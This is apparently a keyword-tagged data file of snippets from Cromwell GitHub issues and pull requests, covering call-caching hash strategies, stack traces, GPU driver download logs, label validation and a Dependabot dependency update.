Security,"ing strategy, only the first task in a workflow will succeed, as the hard-link duplication strategy will cause the path ""absolute"" be different (causing a hash differential). ## Questions. - ~What defines a cache hit, or exactly which information is used to the call hash?~; > I'll answer this one myself, by looking at the metadata returned from `/api/workflows/{version}/{id}/metadata`, within the `calls.$yourstepname.callCaching`, the hashes field has the following attributes:; > - `output count`; > - `runtime attribute`; > - `output expression`; > - `input count`; > - `backend name`; > - `command template`; > - `input`. - ~When does the command section get hashed (before or after replacements)?~; > The template gets cached. - ~What other elements go into the building the cache?~; > output count, runtime attribute, output expression, input count, backend name, command template, input. - What are the downsides with `check-sibling-md5`, can it be used in conjunction with `system.file-hash-cache`. - **Is the only way to use call-caching with containers without fully hashing the file?**. ## Possible resolutions. I was thinking the following might be potential solutions for my problem, but I don't know how good / bad they are, and they'd require changes to Cromwell. - Potential for a _cheaper_ (and potentially dirtier) hash for files? ; - When cromwell links from a cached result, store a map of { newpath : original } link to use or call caching, so when the hashDifferential is calculated, it uses the hash of the original cached result. (This would mean we could use the path+modtime strategy). ## Current attempt. I realised I may have run into another error here: https://github.com/broadinstitute/cromwell/issues/5348. This is my current configuration, it will successfully pull cache for the FIRST step in a workflow, but then fail afterwards. <details><summary>Click to show configuration</summary><p>. ```hocon; include required(classpath(""application"")). system: {; ""job-she",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:3241,hash,hash-cache,3241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,1,['hash'],['hash-cache']
Security,"ing successfully; [2022-12-15 21:23:00,36] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.phenotype:-1:1-20000000025 [9e4f5894main.phenotype:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,36] [info] BT-322 9e4f5894:main.phenotype:-1:1 cache hit copying success with aggregated hashes: initial = 018D1BC619E22671C2125EEDE82AB210, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,36] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.phenotype:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,37] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.date_of_death:-1:1-20000000026 [9e4f5894main.date_of_death:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,37] [info] BT-322 9e4f5894:main.date_of_death:-1:1 cache hit copying success with aggregated hashes: initial = 179EA0EE9B87629C24E64D33DEB38610, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,37] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.date_of_death:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,67] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.white_brits:-1:1-20000000000 [9e4f5894main.white_brits:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,68] [info] BT-322 9e4f5894:main.white_brits:-1:1 cache hit copying success with aggregated hashes: initial = EB2F16A657136E0208581A7B6A7F020F, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,68] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.white_brits:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:02,52] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:26261,hash,hashes,26261,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"ing/; - https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options; - https://cromwell.readthedocs.io/en/stable/backends/HPC/#shared-filesystem. Cache duplication strategies:; - `hard-link`; - `soft-link` - This strategy is not applicable for tasks which specify a Docker image and will be ignored.; - `copy`; - ~`cached-copy`~ - This is non-cache duplication strategy. Cache hashing strategies:; - `file` - (default) computes an md5 hash of the file content. [Code: `tryWithResource(() => file.newInputStream) { DigestUtils.md5Hex }`]; - `path` - computes an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"".; - `path+modtime` - compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. [Code: `md5Hex(file.toAbsolutePath.pathAsString + file.lastModifiedTime.toString)`]. Other caching options:. - `system.file-hash-cache` - Prevent repeatedly requesting the hashes of the same files multiple times. - `backend.providers.Local.caching.check-sibling-md5` - will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. ## My takeaway. - I can't use a `softlink` cache duplication strategy as it's not allowed for containers. - If I select the `path+modtime` hashing strategy, only the first task in a workflow will succeed, as the hard-link duplication strategy will cause the path ""absolute"" be different (causing a hash differential). ## Questions. - ~What defines a cache hit, or exactly which information is used to the call hash?~; > I'll answer this one myself, by looking at the metadata returned from `/api/workflows/{version}/{id}/metadata`, within the `calls.$yourstepname.callCaching`, the hashes field has the following attributes:; > - `output count`; > - `runtime attribute`; > - `output expression`; > - `input count`; > - `backend name`; > - `command template`; > -",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:1821,hash,hash-cache,1821,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,2,['hash'],"['hash-cache', 'hashes']"
Security,"ing:z ubuntu@sha256:2d7ecc9c5e08953d586a6e50c29b91479a48f69ac1ba1f9dc0420d18a728dfc5 /cromwell-executions/HelloWorldWithDocker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/script; Hello Docker; +++ cat /home/jaruga/git/dockstore-cli-docker-test/cromwell-executions/HelloWorldWithDocker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/docker_cid; ++ docker wait 56df02a84010fae2573793c374e4ae3c506dc5c9a759169d09c378d0dcdfaa0d; + rc=0; ++ cat /home/jaruga/git/dockstore-cli-docker-test/cromwell-executions/HelloWorldWithDocker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/docker_cid; + docker rm 56df02a84010fae2573793c374e4ae3c506dc5c9a759169d09c378d0dcdfaa0d; 56df02a84010fae2573793c374e4ae3c506dc5c9a759169d09c378d0dcdfaa0d; + exit 0; ```. ## Workaround. I was able to suppress this error by disabling SE Linux on Fedora 36. But this is not an ideal way. Because I think SE Linux is enabled (Current mode: enforcing) as a default on RPM-based distributions such as Fedora, RHEL, CentOS stream and etc for security reasons. ```; $ sestatus ; SELinux status: enabled; SELinuxfs mount: /sys/fs/selinux; SELinux root directory: /etc/selinux; Loaded policy name: targeted; Current mode: enforcing; Mode from config file: enforcing; Policy MLS status: enabled; Policy deny_unknown status: allowed; Memory protection checking: actual (secure); Max kernel policy version: 33; ```. Disabled like this. ```; $ sudo setenforce 0. $ sestatus; SELinux status: enabled; SELinuxfs mount: /sys/fs/selinux; SELinux root directory: /etc/selinux; Loaded policy name: targeted; Current mode: permissive; Mode from config file: enforcing; Policy MLS status: enabled; Policy deny_unknown status: allowed; Memory protection checking: actual (secure); Max kernel policy version: 33; ```. I think you can try [SE Linux on Ubuntu](https://wiki.ubuntu.com/SELinux) to reproduce this error if you only have Debian-based Linux. <!-- Paste your configuration if possib",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6905:7747,secur,security,7747,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6905,1,['secur'],['security']
Security,input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_att,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:4203,hash,hashes,4203,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"instead of registering the workflow id as the collection, as currently happens, register the collection name. if a collection was not specified (it's optional) create a collection name, `USERNAME_caas_collection`. . If the collection name specified already exists in sam and the user does not have write access to it it will return an error (or at least that's the belief of the author of this ticket). Make sure to detect that and return an appropriate error.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2837:304,access,access,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2837,1,['access'],['access']
Security,"integrity, but this was not their intended purpose. Md5sum was intended as a cryptographic hash. A cryptographic hash has the following properties (wikipedia):; 1. it is deterministic, meaning that the same message always results in the same hash; 2. it is quick to compute the hash value for any given message; 3. it is infeasible to generate a message that yields a given hash value; 4. it is infeasible to find two different messages with the same hash value; 5. a small change to a message should change the hash value so extensively that the new hash value appears uncorrelated with the old hash value (avalanche effect). I contest point 2, in that many cryptographic explicitly strife for being slow to calculate in order to negate brute force attempts.; Anyway: for call caching we only need points 1. and 4. All the rest is unnecessary ballast. . ## xxHash; Luckily there is a hashing algorithm that is designed explicitly for content hashing only. It was made to generate reliably different hashes for file content as fast as possible. It's called [xxHash](https://www.xxhash.com). There are Java implementations available and I did [some extensive benchmarking](https://github.com/rhpvorderman/hashtest/) to find out which one was best. The xxh64 (xxhash for 64 bit machines) algorithm was 15 times faster than the java implementation of md5 we currently use in Cromwell. This PR implements the xxhash algorithm for call-caching in Cromwell:. + The default strategy will still be using md5 for backwards compatibility.; + A new `xxh64` strategy is implemented using the 64-bit xxhash algorithm. (I didn't make the xxh32 algorithm available. Is there any Cromwell server still running on 32-bit?) This can be set in the call caching configuration.; + A new `fingerprint` strategy suggested by @illusional, which takes the modtime, size and a xxh64 hash of the first 10 mb of the file to create a virtually unique fingerprint.; + The `file` strategy get's a new alias `md5` which is more clea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450:1943,hash,hashes,1943,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450,1,['hash'],['hashes']
Security,io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.security.validator.Validator.validate(Validator.java:256); at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslClientContext$ExtendedTrustManagerVerifyCallback.verify(ReferenceCountedOpenSslClientContext.java:234); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslContext$AbstractCertificateVerifier.verify(ReferenceCountedOpenSslContext.java:779); at io.grpc.netty.shaded.io.netty.internal.tcnative.CertificateVerifierTask.runTask(CertificateVerifierTask.java:36); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:48); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:42); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.runAndResetNeedTask(ReferenceCountedOpenSslEngine.java:1496); at io.grpc.netty.shaded.io.netty.handler.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:7271,validat,validate,7271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,2,"['Validat', 'validat']","['Validator', 'validate']"
Security,io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:174); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.security.validator.Validator.validate(Validator.java:256); at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslClientContext$ExtendedTrustManagerVerifyCallback.verify(ReferenceCountedOpenSslClientContext.java:234); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslContext$AbstractCertificateVerifier.verify(ReferenceCountedOpenSslContext.java:779); at io.grpc.netty.shaded.io.netty.internal.tcnative.CertificateVerifierTask.runTask(CertificateVerifierTask.java:36); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:48); at io.grpc.netty.shaded.io.netty.internal.tcnative.S,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:7069,secur,security,7069,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['secur'],['security']
Security,"ion\n[INFO 2021-02-22 23:09:19 UTC] Cache file /usr/local/nvidia/.cache not found.\n[INFO 2021-02-22 23:09:19 UTC] Did not find cached version, building the drivers...\n[INFO 2021-02-22 23:09:19 UTC] Downloading GPU installer ... \n[INFO 2021-02-22 23:09:19 UTC] Downloading from https://storage.googleapis.com/nvidia-drivers-us-public/nvidia-cos-project/85/tesla/450_00/450.51.06/NVIDIA-Linux-x86_64-450.51.06_85-13310-1209-10.cos\n[INFO 2021-02-22 23:09:19 UTC] Downloading GPU installer from https://storage.googleapis.com/nvidia-drivers-us-public/nvidia-cos-project/85/tesla/450_00/450.51.06/NVIDIA-Linux-x86_64-450.51.06_85-13310-1209-10.cos\n\nreal\t0m1.891s\nuser\t0m0.181s\nsys\t0m0.449s\n[INFO 2021-02-22 23:09:21 UTC] Setting up compilation environment\n[INFO 2021-02-22 23:09:21 UTC] Obtaining toolchain_env file from https://storage.googleapis.com/cos-tools/13310.1209.10/toolchain_env\n[INFO 2021-02-22 23:09:21 UTC] Downloading toolchain_env file from https://storage.googleapis.com/cos-tools/13310.1209.10/toolchain_env\n\nreal\t0m0.042s\nuser\t0m0.014s\nsys\t0m0.003s\n[INFO 2021-02-22 23:09:21 UTC] Found toolchain path file locally\nls: cannot access '/build/cos-tools': No such file or directory\n[INFO 2021-02-22 23:09:21 UTC] /build/cos-tools: \nls: cannot access '/build/cos-tools': No such file or directory\n[INFO 2021-02-22 23:09:21 UTC] Downloading toolchain from https://storage.googleapis.com/chromiumos-sdk/2020/06/x86_64-cros-linux-gnu-2020.06.25.065836.tar.xz\n[INFO 2021-02-22 23:09:21 UTC] Downloading toolchain archive from https://storage.googleapis.com/chromiumos-sdk/2020/06/x86_64-cros-linux-gnu-2020.06.25.065836.tar.xz\ncurl: (16) Error in the HTTP2 framing layer\n\nreal\t0m3.705s\nuser\t0m0.573s\nsys\t0m1.834s\n[ERROR 2021-02-22 23:09:25 UTC] Could not download toolchain archive from https://storage.googleapis.com/chromiumos-sdk/2020/06/x86_64-cros-linux-gnu-2020.06.25.065836.tar.xz, giving up.\n"". What caused those errors? Any recommendations?; Thanks!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6195:4920,access,access,4920,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6195,2,['access'],['access']
Security,iptorActor.scala:86); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:110); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:109); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2.apply(MaterializeWorkflowDescriptorActor.scala:109); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2.apply(MaterializeWorkflowDescriptorActor.scala:103); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:103); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$receive$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:66); at akka.actor.Actor$class.aroundReceive(Actor.scala:467); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.aroundReceive(MaterializeWorkflowDescriptorActor.scala:59); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:516); at akka.actor.ActorCell.invoke(ActorCell.scala:487); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:238); at akka.dispatch.Mailbox.run(Mailbox.scala:220); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoin,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/705:3919,Validat,Validation,3919,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/705,3,['Validat'],['Validation']
Security,irectExecutor.execute(DirectExecutor.java:31); at com.google.common.util.concurrent.AbstractFuture.executeListener(AbstractFuture.java:1277); at com.google.common.util.concurrent.AbstractFuture.complete(AbstractFuture.java:1038); at com.google.common.util.concurrent.AbstractFuture.setException(AbstractFuture.java:808); at io.grpc.stub.ClientCalls$GrpcFuture.setException(ClientCalls.java:574); at io.grpc.stub.ClientCalls$UnaryStreamToFuture.onClose(ClientCalls.java:544); at io.grpc.PartialForwardingClientCallListener.onClose(PartialForwardingClientCallListener.java:39); at io.grpc.ForwardingClientCallListener.onClose(ForwardingClientCallListener.java:23); at io.grpc.ForwardingClientCallListener$SimpleForwardingClientCallListener.onClose(ForwardingClientCallListener.java:40); at com.google.api.gax.grpc.ChannelPool$ReleasingClientCall$1.onClose(ChannelPool.java:541); at io.grpc.internal.ClientCallImpl.closeObserver(ClientCallImpl.java:576); at io.grpc.internal.ClientCallImpl.access$300(ClientCallImpl.java:70); at io.grpc.internal.ClientCallImpl$ClientStreamListenerImpl$1StreamClosed.runInternal(ClientCallImpl.java:757); at io.grpc.internal.ClientCallImpl$ClientStreamListenerImpl$1StreamClosed.runInContext(ClientCallImpl.java:736); at io.grpc.internal.ContextRunnable.run(ContextRunnable.java:37); at io.grpc.internal.SerializingExecutor.run(SerializingExecutor.java:133); at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144); at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642); at java.base/java.lang.Thread.run(Thread.java:1570); Suppressed: com.google.api.gax.rpc.AsyncTaskException: Asynchronous task failed; at com.google.api.gax.rpc.ApiExceptions.callAndTranslateApiException(ApiExceptions.java:57); at com.google.api.gax.rpc.UnaryCallable.call(UnaryCallable.java:112); at com.google.cloud.batch.v1.BatchServiceClient.getJob(BatchServiceClient.java:427); at cromwell.backend.google.batch.api.GcpB,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:2491,access,access,2491,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['access'],['access']
Security,"is pipeline can still work. . Related code reporting error is [here](https://github.com/broadinstitute/cromwell/blob/dbd8a2aca7253cecd852b5b44ff199e35cdb81cd/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/models/GcpLabel.scala#L65) and error is produce [here](https://github.com/broadinstitute/cromwell/blob/dbd8a2aca7253cecd852b5b44ff199e35cdb81cd/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/models/GcpLabel.scala#L77) and [this is the regex definition](https://github.com/broadinstitute/cromwell/blob/dbd8a2aca7253cecd852b5b44ff199e35cdb81cd/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/models/GcpLabel.scala#L21). I am wondering can the [code](https://github.com/broadinstitute/cromwell/blob/dbd8a2aca7253cecd852b5b44ff199e35cdb81cd/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/models/GcpLabel.scala#L77) be updated to only check the key of a label so it aligns with GCP which does not have this restriction on label values? Or use another regex `""[a-z0-9]([-a-z0-9]*[a-z0-9])?""` for label value check?. Cromwell version: I built develop container, and the tag is `87-ee2b10f-SNAP`.; Backend: GCP Batch. Please let me know if this could be something you guys would accept before I put in PR. Thanks. <!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7351:2823,PASSWORD,PASSWORDS,2823,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7351,1,['PASSWORD'],['PASSWORDS']
Security,"ith file strategy; The `file` strategy does work as it uses md5sums in order to calculate the file hash. An unfortunate side effect of this is that md5 uses massive system resources. On HPC systems that are the target for the sfs-backend, this is a big problem. Cromwell will be run from a submit node on the system and greedily grab all processing power on the submit node to calculate all the md5sums. . ## Md5sums; Md5sums are reliable hashes for file integrity, but this was not their intended purpose. Md5sum was intended as a cryptographic hash. A cryptographic hash has the following properties (wikipedia):; 1. it is deterministic, meaning that the same message always results in the same hash; 2. it is quick to compute the hash value for any given message; 3. it is infeasible to generate a message that yields a given hash value; 4. it is infeasible to find two different messages with the same hash value; 5. a small change to a message should change the hash value so extensively that the new hash value appears uncorrelated with the old hash value (avalanche effect). I contest point 2, in that many cryptographic explicitly strife for being slow to calculate in order to negate brute force attempts.; Anyway: for call caching we only need points 1. and 4. All the rest is unnecessary ballast. . ## xxHash; Luckily there is a hashing algorithm that is designed explicitly for content hashing only. It was made to generate reliably different hashes for file content as fast as possible. It's called [xxHash](https://www.xxhash.com). There are Java implementations available and I did [some extensive benchmarking](https://github.com/rhpvorderman/hashtest/) to find out which one was best. The xxh64 (xxhash for 64 bit machines) algorithm was 15 times faster than the java implementation of md5 we currently use in Cromwell. This PR implements the xxhash algorithm for call-caching in Cromwell:. + The default strategy will still be using md5 for backwards compatibility.; + A new `xxh64` ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450:1455,hash,hash,1455,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450,3,['hash'],['hash']
Security,"ity score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=com.fasterxml.jackson.core:jackson-databind&package-manager=maven&previous-version=2.13.4.1&new-version=2.13.4.2)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores). You can trigger a rebase of this PR by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself); You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/broadinstitute/cromwell/network/alerts). </details>> **Note**; > Automatic rebases have been disabled on this pull request as it has been open for over 30 days.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7110:2044,secur,security,2044,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7110,2,"['Secur', 'secur']","['Security', 'security']"
